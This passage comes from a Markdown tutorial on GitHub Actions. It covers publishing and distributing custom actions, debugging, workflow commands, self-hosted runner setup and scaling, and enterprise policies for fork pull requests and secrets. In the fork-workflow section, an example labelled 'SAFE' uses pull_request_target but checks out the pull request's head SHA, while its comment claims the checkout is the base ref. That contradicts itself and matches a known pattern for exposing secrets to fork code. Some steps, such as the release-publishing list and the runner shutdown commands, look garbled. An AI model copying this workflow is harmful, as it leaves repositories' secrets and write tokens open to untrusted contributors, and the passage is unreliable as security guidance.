    registry-user: myuser
    image-tag: v1.0
```

## Support Timeline

- v1 support ends: December 31, 2025
- v2 is recommended for all new workflows

```text

```

#### Publishing Release Notes

Effective release notes guide users on when to upgrade:

```markdown
# v1.2.0 - New Features and Improvements

## What's New

- 🎉 Added support for multiple registries (GitHub Container Registry + Docker Hub)
- ✨ `registry-select` input allows choosing target registry
- ⚡ 25% faster image push with parallel uploads
- 🔧 Support for custom Dockerfile names via `dockerfile-path` input

## Bug Fixes

- Fixed issue where special characters in image names caused failures
- Corrected permission error when pushing to registry

## Backward Compatible

- All v1.x.x consumers unaffected
- Optional new inputs: `registry-select`, `dockerfile-path`
- Update to v1.2.0 when ready, or stay on v1.1.x

## Upgrade Path

For most users: `uses: org/action@v1` (auto-receives this update)
To opt out: Pin to `uses: org/action@v1.1.5`

## Contributors

Thanks to @user1 for registry support and @user2 for performance improvements!
```

---

### 4.5 **Action Distribution Models**

Actions can be distributed and consumed in different ways. Choose the model that best fits your use case, team structure, and organizational needs.

#### Distribution Models Comparison

| Model                   | Location                 | Visibility           | Discovery                      | Best For                               | Effort | Cost           |
| ----------------------- | ------------------------ | -------------------- | ------------------------------ | -------------------------------------- | ------ | -------------- |
| **Public Repo**         | GitHub repository        | Public               | Stars, search, forks           | Open source, community sharing         | Low    | Free           |
| **Private Repo**        | GitHub repository        | Private organization | Within org                     | Internal tools, proprietary code       | Low    | Free           |
| **GitHub Marketplace**  | Published to Marketplace | Public               | Marketplace UI, verified badge | Broad adoption, trusted actions        | Medium | Free           |
| **Private Marketplace** | Organization Marketplace | Private (org only)   | Within org, org registry       | Enterprise standards, curated list     | Medium | $21/user/month |
| **Git Submodule/Clone** | External repository      | Varies               | Manual checkout                | Version control integration, monorepos | Low    | Free           |
| **Package Registry**    | NPM, Docker Hub, etc.    | Varies               | npm/Docker registries          | Dual distribution (action + package)   | High   | Varies         |

#### Public Repository Model

**Setup:**

```bash
# Create public repository
gh repo create my-action --public --clone
cd my-action

# Create action.yml, index.js, action icons
# Commit and push to main
git add .
git commit -m "Initial action"
git push origin main

# Tag release
git tag -a v1.0.0 -m "Release v1.0.0"
git push origin v1.0.0
```

**Consumer Usage:**

```yaml
- uses: username/my-action@v1.0.0
- uses: username/my-action@v1 # Major version (gets updates)
- uses: username/my-action@main # Development version
```

**Discoverability:**

- GitHub topics/search: Users search "actions" find your repo
- Stars: Community validation
- Forks: Adoption signal

#### Private Repository Model

**Setup:**

```bash
# Create organization private repository
gh repo create my-internal-action --private --org=MY-ORG
```

**Consumer Usage:**

```yaml
jobs:
  build:
    steps:
      - uses: MY-ORG/my-internal-action@v1 # Requires org context
        with:
          api-key: ${{ secrets.INTERNAL_API_KEY }}
```

**Access Control:**

```text
Settings > Actions > Access:
- Accessible to: All repositories
- Or specific repositories
- Team/user permissions via organization roles
```

#### GitHub Marketplace Model

**Requirements:**

```yaml
# action.yml must be valid and complete
name: "My Action"
description: "Clear description"
author: "Your Name"
branding:
  icon: "check-square"
  color: "blue"
inputs:
  # Required: at least one input
  environment:
    description: "Target environment"
    required: true
outputs:
  result:
    description: "Action result"
runs:
  using: "composite"
  steps: [...]
```

**Publishing Steps:**

1. Go to repository → **Code** tab
2. Select "Release" on right side
3. **← or directly**: Settings > Code, security & analysis → Release new version
4. Click "Create a new release"
5. Select/create tag (e.g., `v1.0.0`)
6. Click "Publish release"
7. Action automatically appears on Marketplace (index nightly)

**Consumer Discovery:**

```text
GitHub.com/marketplace
Browse "Actions" category
Search for your action name
Click to view details, installation code
```

**Marketplace Badge:**

```markdown
# My Action

[![GitHub Marketplace](https://img.shields.io/badge/Marketplace-v1.0.0-blue?logo=github)](https://github.com/marketplace/actions/my-action)

[![Tests](https://github.com/username/my-action/workflows/tests/badge.svg)](https://github.com/username/my-action/actions)
```

#### Private Marketplace Model (Enterprise)

**Setup** (requires GitHub Enterprise Cloud):

```bash
# Organization > Settings > Actions > Runners > Private Marketplace

# Add approved actions to private marketplace:
# 1. Go to Action on public marketplace
# 2. Click "Add to organization private marketplace"
# 3. Or: Admin panel > Organization > Actions > Private Marketplace > Add
```

**Policies:**

```text
Organization Private Marketplace:
- Control which actions are approved for use
- Force specific versions (e.g., only v2.0.0+)
- Prevent use of unapproved external actions
- Track usage and compliance
- Curate internal best practices
```

**Consumer Experience:**

```text
When creating new workflow:
- "New workflow" → "Use a public marketplace action"
- Only shows private marketplace + approved public actions
- Enforces org security policies
```

#### Comparison: When to Use Each Model

**Use Public Repo If:**

- Action solves general problem
- Want community feedback and contributions
- Seeking broad adoption
- Open-source philosophy
- Low maintenance burden

**Use Private Repo If:**

- Action is proprietary or business-specific
- Team/organization use only
- Security-sensitive code
- Don't want external visibility
- Simplicity key

**Use Marketplace If:**

- Want maximum discoverability
- Believe many teams need this
- Willing to maintain documentation
- Ready for external feedback and issues
- Plan long-term support

**Use Private Marketplace If:**

- Enterprise organization
- Need governance/compliance
- Want to curate approved actions
- Force policy compliance (specific versions)
- Track organization-wide usage

#### Migration Path Example

```text
Phase 1: Development
┌─────────────────────┐
│ Private Repository  │ (Team develops)
│ + Local testing     │
└─────────────────────┘
           ↓
Phase 2: Stability
┌─────────────────────┐
│ Public Repository   │ (v1.0.0 released)
│ + Public Releases   │ (Get initial feedback)
└─────────────────────┘
           ↓
Phase 3: Discoverability
┌─────────────────────┐
│ GitHub Marketplace  │ (Published & indexed)
│ + Documentation     │ (Examples, use cases)
└─────────────────────┘
           ↓
Phase 4: Enterprise Adoption
┌─────────────────────┐
│ Private Marketplace │ (Org whitelist + governance)
│ + Usage Tracking    │ (Compliance dashboard)
└─────────────────────┘
```

---

### 5. **Best Practices for Actions**

#### ✓ Recommended Practices

```yaml
# ✓ Use semantic versioning
- uses: owner/action@v1.0.0  # Specific version
- uses: owner/action@v1      # Major version (auto-updates)
- uses: owner/action@main    # Development (for testing)

# ✓ Provide clear inputs and outputs
inputs:
  environment:
    description: 'Target environment for deployment'
    required: true
    type: choice
    options:
      - staging
      - production

# ✓ Add comprehensive documentation
# Include examples for common use cases
# Document all inputs, outputs, and error cases

# ✓ Cache dependencies
- name: Cache Node Modules
  uses: actions/cache@v3
  with:
    path: node_modules
    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}

# ✓ Provide informative output
core.info('Deployment started');
core.debug('Debug information');
core.warning('Warning message');
core.error('Error message');
```

#### ✗ Anti-Patterns to Avoid

```yaml
# ✗ Don't hardcode sensitive information
uses: owner/action@v1
  with:
    api-key: "sk-1234567890"  # NEVER!

# ✗ Don't create actions that require external setup
# Actions should be self-contained

# ✗ Don't ignore action versioning
- uses: owner/action@main  # Risky in production!

# ✗ Don't make breaking changes without major version update
# v1.1.0: backward compatible only
# v2.0.0: breaking changes allowed
```

---

### 6. **Debugging and Troubleshooting Actions**

#### Enabling Debug Logging

GitHub Actions provides two repository secrets that enable verbose diagnostic output:

| Secret                        | Effect                                                            |
| ----------------------------- | ----------------------------------------------------------------- |
| `ACTIONS_STEP_DEBUG = true`   | Shows `core.debug()` output and detailed step-level traces        |
| `ACTIONS_RUNNER_DEBUG = true` | Enables runner-level diagnostic logs (agent and environment info) |

Set these in **Repository Settings → Secrets → Actions** or enable debug logging when re-running a failed job via the **"Enable debug logging"** checkbox in the UI.

#### Debugging JavaScript Actions

```javascript
const core = require("@actions/core");

// Only visible in logs when ACTIONS_STEP_DEBUG=true
core.debug("Entering deployment phase with config: " + JSON.stringify(config));

// Always visible
core.info("Step starting");
core.warning("Non-fatal issue — proceeding with defaults");
core.error("Critical error encountered"); // marks the step as failed

async function run() {
  try {
    const value = core.getInput("my-input", { required: true });
    // ... logic
    core.setOutput("result", value);
  } catch (error) {
    core.setFailed(`Action failed: ${error.message}`);
  }
}

run();
```

> **Common issue:** `Cannot find module '@actions/core'` — `node_modules` were not bundled into `dist/`.
> Fix: run `npx @vercel/ncc build index.js -o dist` and commit the generated `dist/` directory.

#### Debugging Docker Container Actions

```bash
# Pull and inspect the action image locally before using in CI
docker pull ghcr.io/owner/my-docker-action:v1
docker run --rm -it --entrypoint /bin/sh ghcr.io/owner/my-docker-action:v1
# Inside the container, manually run the entrypoint to observe behavior
```

```yaml
# Pass a DEBUG env var — many Docker actions check this
- uses: my-org/my-docker-action@v1
  env:
    DEBUG: "1"
```

> Add `set -x` at the top of your entrypoint shell script to emit a full execution trace in the runner log.

#### Debugging Composite Actions

```yaml
steps:
  - name: Debug inputs
    shell: bash
    run: |
      echo "environment=${{ inputs.environment }}"
      echo "version=${{ inputs.version }}"
      echo "pwd=$(pwd)"

  - name: Your step
    id: main
    shell: bash
    run: ./deploy.sh
    continue-on-error: true  # Prevent early exit so the diagnosis step below runs

  - name: Debug outcome
    if: always()
    shell: bash
    run: echo "Step outcome: ${{ steps.main.outcome }}"
```

#### Common Action Failure Patterns

| Symptom                              | Likely Cause                                   | Resolution                                           |
| ------------------------------------ | ---------------------------------------------- | ---------------------------------------------------- |
| `Error: Required input missing`      | `with:` block in caller omits a required input | Add the missing input in the calling workflow        |
| `Cannot find module '@actions/core'` | `node_modules` not committed / bundled         | Run `ncc build` and commit `dist/`                   |
| Docker action exits with code 1      | Entrypoint script error                        | Add `set -x` in entrypoint for full trace            |
| Composite step silently skipped      | `if:` condition evaluates false                | Check step `if:` expressions and prior step outcomes |
| Output not available to caller       | Step is missing an `id:`                       | Add `id:` to the output-producing step               |
| Dependency version conflict          | `package-lock.json` mismatch                   | Delete `node_modules`, run `npm ci`, rebuild `dist/` |

### 7. **Using Workflow Commands Inside Custom Actions**

Custom actions can emit structured output to the runner log and pass data back to the calling workflow using **workflow commands**. These are special strings written to stdout in the format `::command parameter=value::message`.

#### Workflow Command Reference

| Command syntax                      | Purpose                                                             | Equivalent JS (via `@actions/core`)     |
| ----------------------------------- | ------------------------------------------------------------------- | --------------------------------------- |
| `::debug::message`                  | Print debug-level log (visible only with `ACTIONS_STEP_DEBUG=true`) | `core.debug()`                          |
| `::notice file=f,line=l::message`   | Create a notice annotation in the PR / summary                      | `core.notice()`                         |
| `::warning file=f,line=l::message`  | Create a warning annotation                                         | `core.warning()`                        |
| `::error file=f,line=l::message`    | Create an error annotation                                          | `core.error()`                          |
| `::group::title` / `::endgroup::`   | Collapse a log section in the UI                                    | `core.startGroup()` / `core.endGroup()` |
| `::add-mask::value`                 | Redact `value` from all subsequent log output                       | `core.setSecret()`                      |
| `echo "name=val" >> $GITHUB_OUTPUT` | Set a step output for the caller to use via `steps.<id>.outputs`    | `core.setOutput()`                      |
| `echo "VAR=val" >> $GITHUB_ENV`     | Append an environment variable for subsequent steps                 | `core.exportVariable()`                 |
| `echo "/path" >> $GITHUB_PATH`      | Prepend a directory to `PATH` for subsequent steps                  | `core.addPath()`                        |

> **Note:** The old `::set-output::`, `::set-env::`, and `::add-path::` command syntax is **deprecated**. Use the `GITHUB_OUTPUT`, `GITHUB_ENV`, and `GITHUB_PATH` environment files instead.

#### Using Workflow Commands in Composite Actions

Composite actions (which use shell `run:` steps) communicate with the caller using the same environment files:

```yaml
# .github/actions/my-composite/action.yml
name: My Composite Action
description: Demonstrates workflow command usage in a composite action
inputs:
  version:
    required: true
    description: Version to process
outputs:
  processed-version:
    description: The normalized version string
    value: ${{ steps.normalize.outputs.result }}

runs:
  using: composite
  steps:
    - name: Mask the version from logs if sensitive
      shell: bash
      run: echo "::add-mask::${{ inputs.version }}"

    - name: Normalize version
      id: normalize
      shell: bash
      run: |
        VERSION="${{ inputs.version }}"
        NORMALIZED="${VERSION#v}"    # Strip leading 'v'
        echo "result=$NORMALIZED" >> $GITHUB_OUTPUT
        echo "::notice::Processed version: $NORMALIZED"

    - name: Group diagnostic output
      shell: bash
      run: |
        echo "::group::Diagnostic info"
        echo "Runner OS: ${{ runner.os }}"
        echo "Version input: ${{ inputs.version }}"
        echo "::endgroup::"
```

#### Using Workflow Commands in JavaScript Actions

JavaScript actions use the `@actions/core` library which wraps the same workflow commands:

```javascript
const core = require("@actions/core");

async function run() {
  const version = core.getInput("version");

  // Mask a derived secret before logging
  const token = process.env.API_TOKEN;
  core.setSecret(token); // Equivalent to ::add-mask::

  core.startGroup("Processing version");
  core.debug(`Raw input: ${version}`);
  const normalized = version.replace(/^v/, "");
  core.info(`Normalized version: ${normalized}`);
  core.endGroup();

  // Pass output back to the workflow
  core.setOutput("processed-version", normalized);

  // Annotate a file with a warning (appears in PR diff)
  core.warning("Version format may be deprecated", {
    file: "package.json",
    startLine: 3,
  });
}

run().catch(core.setFailed);
```

#### Accessing Action Outputs in the Calling Workflow

```yaml
jobs:
  example:
    runs-on: ubuntu-latest
    steps:
      - name: Run composite action
        id: my-action
        uses: ./.github/actions/my-composite
        with:
          version: "v1.2.3"

      - name: Use the output
        run: echo "Processed: ${{ steps.my-action.outputs.processed-version }}"
```

---

## Managing Runners

### What are Runners

Runners are servers that execute jobs in your GitHub Actions workflows. GitHub provides hosted runners (Ubuntu, Windows, macOS) or you can use self-hosted runners for custom environments, specific hardware, or private networks.

### Why Manage Runners

**Key Benefits:**

1. **Control**: Run workflows on specific hardware or software
2. **Cost**: Self-hosted runners reduce per-minute charges
3. **Privacy**: Keep code on your own infrastructure
4. **Speed**: Local runners eliminate network latency
5. **Customization**: Custom tools, libraries, and configurations
6. **Compliance**: Meet security and regulatory requirements
7. **Capacity**: Scale without GitHub's limitations

### How Runners Work

**Hosted Runners**: GitHub-managed servers with standard operating systems
**Self-Hosted Runners**: Your own servers or machines running the GitHub Actions agent

### 1. **Understanding Hosted Runners**

**Runner Types and Specifications:**

```yaml
jobs:
  # Ubuntu hosted runner (most common)
  ubuntu-job:
    runs-on: ubuntu-latest # or ubuntu-22.04, ubuntu-20.04
    steps:
      - run: echo "Running on Ubuntu"

  # Windows hosted runner
  windows-job:
    runs-on: windows-latest # or windows-2022, windows-2019
    steps:
      - run: echo "Running on Windows"

  # macOS hosted runner
  macos-job:
    runs-on: macos-latest # or macos-12, macos-11
    steps:
      - run: echo "Running on macOS"
```

**Hosted Runner Specifications:**

| Runner         | CPUs | Memory | Storage | Network |
| -------------- | ---- | ------ | ------- | ------- |
| ubuntu-latest  | 2+   | 7 GB   | 14 GB   | 1 Gbps  |
| windows-latest | 2+   | 7 GB   | 14 GB   | 1 Gbps  |
| macos-latest   | 3+   | 14 GB  | 14 GB   | 1 Gbps  |

### 2. **Setting Up Self-Hosted Runners**

**Installation on Linux:**

```bash
#!/bin/bash

# On your server/machine
mkdir actions-runner && cd actions-runner

# Download latest runner
wget https://github.com/actions/runner/releases/download/v2.311.0/actions-runner-linux-x64-2.311.0.tar.gz
tar xzf ./actions-runner-linux-x64-2.311.0.tar.gz

# Configure runner
./config.sh --url https://github.com/owner/repo --token YOUR_REGISTRATION_TOKEN

# Install as service (optional)
sudo ./svc.sh install
sudo ./svc.sh start
```

**The GitHub UI provides specific token and setup instructions:**

```text
Repository Settings > Actions > Runners > New self-hosted runner

1. Select Operating System (Linux, Windows, macOS)
2. Select Architecture (x64, ARM64, ARM)
3. Copy and run provided commands
4. Runner automatically registers with your repository
```

### 3. **Using Self-Hosted Runners in Workflows**

```yaml
jobs:
  build:
    # Run on specific self-hosted runner
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v3
      - run: ./build.sh

  deploy:
    # Use runner with specific label
    runs-on: [self-hosted, linux, x64]
    steps:
      - run: ./deploy.sh

  deploy-special:
    # Run on runner with GPU
    runs-on: [self-hosted, gpu, cuda-12]
    steps:
      - run: python train_model.py # GPU-accelerated
```

### 4. **Managing Self-Hosted Runners via API**

**List Runners:**

```bash
curl -H "Authorization: token YOUR_TOKEN" \
  https://api.github.com/repos/owner/repo/actions/runners
```

**Response:**

```json
{
  "total_count": 2,
  "runners": [
    {
      "id": 1,
      "name": "runner-1",
      "os": "linux",
      "status": "online",
      "busy": false,
      "labels": [
        { "name": "self-hosted" },
        { "name": "gpu" },
        { "name": "linux" }
      ]
    }
  ]
}
```

### 5. **Runner Labels and Organization**

```yaml
name: Pipeline with Runner Selection

on: push

jobs:
  quick-tests:
    runs-on: [self-hosted, linux, fast]
    steps:
      - run: echo "Running on fast runner"

  heavy-build:
    runs-on: [self-hosted, linux, gpu, high-memory]
    steps:
      - run: echo "Running on high-performance runner with GPU"

  mobile-build:
    runs-on: [self-hosted, macos, arm64]
    steps:
      - run: echo "Building for iOS/macOS on Apple Silicon"

  integration-tests:
    runs-on: [self-hosted, docker, docker-in-docker]
    steps:
      - run: docker build -t myapp .
```

### 6. **Scaling and Monitoring Runners**

**Monitoring runner health and status:**

Use the GitHub REST API to monitor runner availability, workload, and online/offline status programmatically.

```bash
# Runner status at repository level
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/actions/runners" \
  | jq '.runners[] | {id, name, os, status, busy, labels: [.labels[].name]}'

# Runner status at organization level
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.github.com/orgs/ORG/actions/runners" \
  | jq '[.runners[] | {name, status, busy}]'
```

**Key status fields:**

| Field    | Values               | Meaning                                           |
| -------- | -------------------- | ------------------------------------------------- |
| `status` | `online` / `offline` | Whether the runner process is reachable by GitHub |
| `busy`   | `true` / `false`     | Whether the runner is currently executing a job   |

**Detecting queue depth (no idle runners):**

```bash
#!/bin/bash
RUNNERS=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.github.com/orgs/ORG/actions/runners" | jq '.runners')

ONLINE=$(echo "$RUNNERS" | jq '[.[] | select(.status=="online")] | length')
BUSY=$(echo "$RUNNERS" | jq '[.[] | select(.busy==true)] | length')
IDLE=$(( ONLINE - BUSY ))

echo "Online: $ONLINE | Busy: $BUSY | Idle: $IDLE"
if [ "$IDLE" -eq 0 ] && [ "$ONLINE" -gt 0 ]; then
  echo "⚠️  All runners busy — jobs may queue. Consider scaling up."
fi
```

**Auto-Scaling Setup (Cloud Provider Example):**

```bash
#!/bin/bash

# Script to check runner workload and scale

API_TOKEN="YOUR_TOKEN"
REPO="owner/repo"

# Get runner status
RUNNERS=$(curl -s -H "Authorization: token $API_TOKEN" \
  https://api.github.com/repos/$REPO/actions/runners | jq '.runners')

BUSY_COUNT=$(echo $RUNNERS | jq '[.[] | select(.busy == true)] | length')
ONLINE_COUNT=$(echo $RUNNERS | jq '[.[] | select(.status == "online")] | length')

echo "Runners - Online: $ONLINE_COUNT, Busy: $BUSY_COUNT"

# If more than 80% busy, scale up
BUSY_PERCENT=$(( (BUSY_COUNT * 100) / ONLINE_COUNT ))

if [ $BUSY_PERCENT -gt 80 ]; then
    echo "High load detected ($BUSY_PERCENT% busy). Scaling up..."
    # Launch new runner instance (cloud-specific command)
    # aws ec2 run-instances --image-id ami-xxx --count 1
fi
```

### 7. **Runner Maintenance and Updates**

```bash
#!/bin/bash

# Graceful runner shutdown
# On the runner machine

cd ~/actions-runner

# Stop accepting new jobs
./run.sh --once

# Wait for current jobs to complete
while ps aux | grep -v grep | grep -q Runner.Listener; do
    echo "Waiting for current job to complete..."
    sleep 10
done

# Remove runner from GitHub
./config.sh remove --token YOUR_REMOVAL_TOKEN

# Update runner
wget https://github.com/actions/runner/releases/download/v2.311.0/actions-runner-linux-x64-2.311.0.tar.gz
tar xzf ./actions-runner-linux-x64-2.311.0.tar.gz

# Re-register
./config.sh --url https://github.com/owner/repo --token YOUR_REGISTRATION_TOKEN
```

### 8. **Best Practices for Runner Management**

#### ✓ Recommended Practices

```yaml
# ✓ Use specific runner labels
runs-on: [self-hosted, linux, docker]

# ✓ Tag runners by capability
# Labels: gpu, docker, high-memory, fast

# ✓ Monitor runner health
- name: Check Runner Health
  run: |
    echo "CPU Usage: $(top -bn1 | grep load)"
    echo "Disk Space: $(df -h /)"
    echo "Memory: $(free -h)"

# ✓ Update runners regularly
# Check for new runner agent versions monthly

# ✓ Secure self-hosted runners
# Run privileged jobs in containers
# Limit network access
# Keep OS and tools updated
```

#### ✗ Anti-Patterns to Avoid

```yaml
# ✗ Don't run PRs from untrusted sources on self-hosted runners
runs-on: self-hosted  # Risky for public repositories!

# ✗ Don't store secrets on runner machines
# Use GitHub Secrets instead

# ✗ Don't run without runner labels
runs-on: self-hosted  # Ambiguous which runner

# ✗ Don't ignore runner isolation
# Each job should be isolated
# Don't share state between runs
```

---

## GitHub Actions for the Enterprise

### Overview

Enterprise-scale usage of GitHub Actions requires governance, access control, and policy enforcement to ensure security, cost efficiency, and consistent standards across teams and repositories.

---

### 1. **Organizational Use Policies**

Organization and enterprise admins can restrict which actions and reusable workflows are allowed.

**Policy options (set in Organization Settings → Actions → General):**

| Policy                   | Description                                              |
| ------------------------ | -------------------------------------------------------- |
| Allow all actions        | No restrictions                                          |
| Allow local actions only | Only actions in the same organization/enterprise         |
| Allow select actions     | An explicit allow list of `owner/repo@ref` patterns      |
| Disable Actions          | Completely disable GitHub Actions for the org/enterprise |

**Allow-list patterns:**

```text
# Allow all verified creator actions
actions/*
github/*

# Allow specific third-party actions (pinned or wildcard)
docker/build-push-action@*
hashicorp/setup-terraform@*

# Allow all actions from a specific org
myorg/*
```

> Wildcard `*` matches any version/ref. Use full SHAs for stronger guarantees.

**Requiring approval for first-time contributors:**

In org settings you can require that first-time contributors have their workflow runs approved by a maintainer before they execute, reducing risk from fork-based attacks.

---

### 2. **Controlling Access to Actions and Workflows Within an Enterprise**

**Repository access controls:**

- Actions in private repositories are only callable by workflows in the same repository by default
- To share across repositories: **Settings → Actions → General → Access → Allow workflows from other repositories**
- For org-level reusable workflows: set the repository visibility to `internal` or configure cross-repo permissions

**Enterprise policies override org policies:**

```text
Enterprise admin → can restrict org admins from changing policies
Org admin        → can set policies within enterprise-allowed bounds
Repo admin       → can set policies within org-allowed bounds
```

**Required workflows (enterprise feature):**

Enterprise admins can enforce that specific reusable workflows run on all repositories matching a filter, regardless of the repository workflow configuration:

```text
Enterprise Settings → Policies → Required workflows
→ Add workflow: org/compliance-workflows/.github/workflows/scan.yml@main
→ Apply to: all repositories in selected organizations
```

**Required workflow enforcement behavior:**

- Required workflows run even if the repository owner disables Actions for the repo
- They are always added to workflow runs regardless of repo-level configuration
- Results appear in the PR checks list just like any other workflow

#### Fork-Specific Workflow Policies

Workflows triggered by pull requests from **forked repositories** run with restricted permissions by default to prevent untrusted code from accessing secrets. Understanding and configuring these policies is critical for public repositories and open-source projects.

**Default behavior for fork PRs:**

| Trigger event                    | Default behavior                                          |
| -------------------------------- | --------------------------------------------------------- |
| `pull_request`                   | Runs with read-only token; secrets NOT available          |
| `pull_request_target`            | Runs with write token and secrets (use with extreme care) |
| Fork from first-time contributor | Requires **manual approval** before workflow runs         |

**Configuring fork PR approval requirements:**

GitHub allows organizations to require manual approval before running workflows for PRs from outside collaborators or first-time contributors:

```
Organization Settings → Actions → General → Fork pull request workflows
→ Options:
   • "Require approval for first-time contributors who are new to GitHub"  (default)
   • "Require approval for first-time contributors"
   • "Require approval for all outside collaborators"
```

For **enterprise-level** enforcement:

```text
Enterprise Settings → Policies → Actions → Fork pull request workflows
→ Enforce one of the approval options across all organizations
```

**Security rules for fork workflows:**

- Secrets are **never** available to `pull_request` workflows from forks (safeguard against credential theft)
- The `GITHUB_TOKEN` in fork PR workflows is always **read-only**
- To grant write access intentionally, use `pull_request_target` — but ONLY after validating the forked code does not run in a privileged context:

```yaml
# ✅ SAFE: pull_request_target with explicit checkout of base ref (not fork code)
on:
  pull_request_target:
    types: [opened, labeled]

jobs:
  label-check:
    if: contains(github.event.pull_request.labels.*.name, 'approved-for-ci')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # Only after labeling approval
```

**Restricting which actions forks can invoke:**

For public repositories with CI triggered by fork PRs, restrict which actions the workflow can use via the organization policy:

```text
Organization → Settings → Actions → General → Policies
→ "Allow select actions and reusable workflows"
→ Add only verified/trusted actions to the allow list
→ This applies to ALL workflows, including those from forks
```

---

### 3. **Runner Groups**

Runner groups organize self-hosted runners and control which repositories or organizations can use them.

**Creating and managing runner groups:**

```bash
# Create a runner group (org level)
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/orgs/ORG/actions/runner-groups \
  -d '{
    "name": "production-runners",
    "visibility": "selected",
    "selected_repository_ids": [12345, 67890],
    "allows_public_repositories": false
  }'
```

**Using a runner group in a workflow:**

```yaml
jobs:
  deploy:
    runs-on:
      group: production-runners # target the group
      labels: [self-hosted, linux] # optionally add label filters
    steps:
      - run: echo "Running on a production runner"
```

**Key access rules:**

- A runner group set to `visibility: private` is accessible only to the org
- A runner group set to `visibility: selected` allows specific repositories
- Enterprise-level groups can span organizations
- A runner can only belong to one group at a time

---

### 4. **IP Allow Lists**

GitHub-hosted runners use a range of dynamic IP addresses. For services that lock down inbound traffic, you have several options:

**Option A:** Retrieve GitHub-hosted runner IPs and add to your allow list

```bash
# Get current GitHub Actions IP ranges (changes frequently)
curl https://api.github.com/meta | jq '.actions'
```

> Note: IP ranges change frequently. GitHub provides webhooks (`meta` event) to notify when the list changes.

**Option B:** Use a self-hosted runner inside your network perimeter

Self-hosted runners run on infrastructure you control, so the source IP is predictable:

```yaml
jobs:
  deploy-internal:
    runs-on: [self-hosted, internal-network]
    steps:
      - run: curl https://internal.company.com/api/deploy
```

**Option C:** GitHub Enterprise Cloud — IP allow list integration

Enterprise Cloud customers can enable the "GitHub Actions" entry in the organization's IP allow list. This automatically allows traffic from GitHub-hosted runner IPs without manual maintenance.

---

### 5. **Preinstalled Software on GitHub-Hosted Runners**

GitHub-hosted runners include a broad set of preinstalled tools in the **tool cache** (`RUNNER_TOOL_CACHE`).

**Key preinstalled categories:**

| Category          | Examples                                                      |
| ----------------- | ------------------------------------------------------------- |
| Language runtimes | Node.js, Python, Ruby, Java (multiple LTS versions), Go, .NET |
| Build tools       | Maven, Gradle, Ant, CMake, make                               |
| Package managers  | npm, pip, bundler, nuget, Homebrew (macOS)                    |
| Cloud CLIs        | AWS CLI, Azure CLI, Google Cloud CLI                          |
| Container tools   | Docker, Docker Compose, kubectl, Helm                         |
| Version control   | Git, GitHub CLI (`gh`)                                        |
| Utilities         | tar, curl, wget, jq, yq                                       |

**Checking what's available:**

```yaml
- name: List available tools
  run: |
    echo "--- Node versions ---"
    ls $RUNNER_TOOL_CACHE/node/
    echo "--- Python versions ---"
    ls $RUNNER_TOOL_CACHE/Python/ || ls $RUNNER_TOOL_CACHE/python/
```

**Using `setup-*` actions to select a version:**

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: "20" # reads from tool cache if available

- uses: actions/setup-python@v5
  with:
    python-version: "3.12"

- uses: actions/setup-java@v4
  with:
    distribution: "temurin"
    java-version: "21"
```

**Finding the full list:**

The complete software manifest for each image is published at:
`https://github.com/actions/runner-images`
Each runner image folder contains an `Included-Software.md` file.

> **Ubuntu 20.04 deprecation:** As of late 2024, `ubuntu-20.04` images are deprecated. Migrate to `ubuntu-22.04` or `ubuntu-latest`.
> **`windows-latest`** now points to Windows Server 2025 images.

**Installing additional software at runtime:**

When a required tool is not preinstalled, you can install it during the job using the runner's package manager:

```yaml
# Ubuntu/Debian — apt-get
- name: Install additional packages
  run: |
    sudo apt-get update
    sudo apt-get install -y jq wget gnupg lsof

# macOS — Homebrew
- name: Install additional packages (macOS)
  run: brew install libpq

# Windows — Chocolatey
- name: Install additional packages (Windows)
  run: choco install -y sysinternals

# Cross-platform — pip (Python)
- name: Install Python packages at runtime
  run: pip install boto3 requests

# Cross-platform — npm global tool
- name: Install Node.js CLI tool at runtime
  run: npm install -g typescript
```

**Strategies for providing custom software:**

| Approach                                                       | Best for                                   | Trade-off                                      |
| -------------------------------------------------------------- | ------------------------------------------ | ---------------------------------------------- |
| `apt-get` / `brew` / `choco` at runtime                        | One-off tools, CI-specific utilities       | Slower starts; network dependency              |
| `setup-*` actions (`setup-node`, `setup-python`, `setup-java`) | Language runtimes with version control     | Well-maintained; uses tool cache               |
| Job container (`container:` key)                               | Pre-baked Linux environments with all deps | Faster cold starts; requires image maintenance |
| Custom self-hosted runner AMI/image                            | Enterprise; consistent heavy toolchains    | High setup cost; own image lifecycle           |

**Using a job container to pre-bake software:**

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: node:20-alpine # all Node.js tools pre-installed in the image
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test # Node.js already available, no setup-* needed
```

**Using `setup-*` actions for version management:**

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: "20"
    cache: "npm" # also caches npm dependencies in the tool cache

- uses: actions/setup-python@v5
  with:
    python-version: "3.12"
    cache: "pip"

- uses: actions/setup-java@v4
  with:
    distribution: "temurin"
    java-version: "21"
    cache: "maven"
```

**Caching custom installed tools across runs:**

```yaml
- name: Cache custom tool
  uses: actions/cache@v4
  id: cache-tool
  with:
    path: ~/.local/bin/mytool
    key: mytool-${{ runner.os }}-v1.2.3

- name: Install custom tool (only on cache miss)
  if: steps.cache-tool.outputs.cache-hit != 'true'
  run: |
    curl -Lo ~/.local/bin/mytool https://example.com/mytool-v1.2.3-linux-amd64
    chmod +x ~/.local/bin/mytool
```

---

### 6. **Secrets and Variables at Organization, Repository, and Environment Levels**

GitHub provides a three-tier hierarchy for secrets and variables, with more specific scopes overriding broader ones.

**Hierarchy (most specific wins):**

```text
Enterprise → Organization → Repository → Environment
```

**Secrets vs Variables:**

| Type     | Stored encrypted?       | Visible in logs? | Use for                     |
| -------- | ----------------------- | ---------------- | --------------------------- |
| Secret   | ✅ Yes — masked in logs | ❌ Never         | API keys, passwords, tokens |
| Variable | ❌ No — plain text      | ✅ Yes           | Non-sensitive config values |

**Accessing in workflows:**

```yaml
env:
  # Secret (from org, repo, or environment)
  API_KEY: ${{ secrets.API_KEY }}

